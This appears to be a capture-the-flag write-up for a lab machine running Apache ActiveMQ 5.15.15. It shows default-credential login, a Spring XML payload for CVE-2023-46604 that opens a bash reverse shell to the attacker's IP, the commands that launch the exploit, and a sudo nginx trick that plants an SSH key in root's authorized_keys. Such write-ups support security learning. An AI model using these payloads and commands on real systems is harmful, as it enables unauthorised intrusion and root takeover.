## Takeaway
## Metadata
- `nmap` identifies port 80 as part of `Apache ActiveMQ` set up but is returning `401 Unthorized`. Looking in the Web Browser, it is prompting for username and password.![[Pasted image 20240305131223.png]]
	- Using default credential `admin:admin`, one can actually log in as admin and identify the version of  `Apache ActiveMQ` as `5.15.15`.![[Pasted image 20240305131823.png]]
- All version before `5.15.16` is vulnerable to `Unauthenticated RCE`.![[Pasted image 20240305131956.png]]
	- https://github.com/NKeshawarz/CVE-2023-46604-RCE
# Exploitation
- Modify the payload as following
	```xml
	<?xml version="1.0" encoding="UTF-8" ?>
	    <beans xmlns="http://www.springframework.org/schema/beans"
	       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	       xsi:schemaLocation="
	     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
	        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
	            <constructor-arg >
	            <list>
	                <value>bash</value>
	                <value>-c</value>
	                <value>/bin/bash -i &gt;&#38; /dev/tcp/10.10.14.6/443 0&gt;&#38;1</value>
	            </list>
	            </constructor-arg>
	        </bean>
	    </beans>
	```
	- ![[Pasted image 20240305133355.png]]
- Host the `xml` with `python3 -m http.server 80` and run `python3 CVE-2023-46604-RCE.py -i 10.10.11.243 --url http://10.10.14.6/poc.xml` to receive a reverse shell call back.![[Pasted image 20240305133555.png]]
# PrivEsc
- Abusing `file write` :
	- Create malicious `nginx` configuration file ![[Pasted image 20240305152304.png]]
	- Start up a `nginx` server running as `root` and supporting `PUT` method by running `sudo usr/sbin/nginx -s reload -p /home/activemq -c /home/activemq/hacker.conf`.
	- Upload SSH public key into `/root/.ssh` by running:
	```shell
		curl -X PUT http://10.10.11.243:8080/.ssh/authorized_keys -d 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCjEiwZK/euAZPdU62Z0x7sn0PhgI9xT1SqoJ2/Ic1XzTsPGkhabexHtV7LuFCoVQb9c5IduV6FEKjn3J8I+s9Z+EO2JTEPyL4nI7HqibKQc6jaAu2ahBqwliLX3GqEY+4geY91+WCa4ltTXx4xKOPTjhHA8k9Q78IWLj/20uZgtfJ9p5ozB3c9yaNR/A5IJPsZeJ130wPxuORrpRcw90y/gdbYx37BIxl9etw0L9LfvI7TjdLCtv9Mqn5g1xXGb9OvyRL4Gcu9exQUUIX4340gyjM9aZC7wtOmnnXUL5YleGV+VwLI3+WKV74oIN8yajNPvdNLWVjq9iFsoLSPEWTfBJoPoPSMOovY2TScYKh+bNtrJTy/6zuqZtSTX3KOtKeHRDrJjVr5c8jnNoYY27yzOxxhqWP5D9dspmydUuF+gs64uNVOrydFUERWsR/s6eyFskCIBLv8j3UQcDZte5V/31hvCfRcA7Nvx8pGeHF9plX6OWkQPoDHOBz+f1/v+T5QJNSKQeag3a+jCifDkT0nXwbw1/M4FR7Taka2TmK8EFxsGsAOYfS2cIM/87vvor9JGkR9P2cHX/h3bGwZIjBNyPL74SpMWsnyNWblOu0UrssaY7YEt5EgHHCLoDziZTmrFWjlv+G4BuHese2Rb3Tg5hUCkaoHtlzY92lOaph1sQ== saxon@Saxon'
	```
	- Finally, run `ssh root@10.10.11.243 -i ../.ssh/id_rsa` to obtain a SSH session as `root`.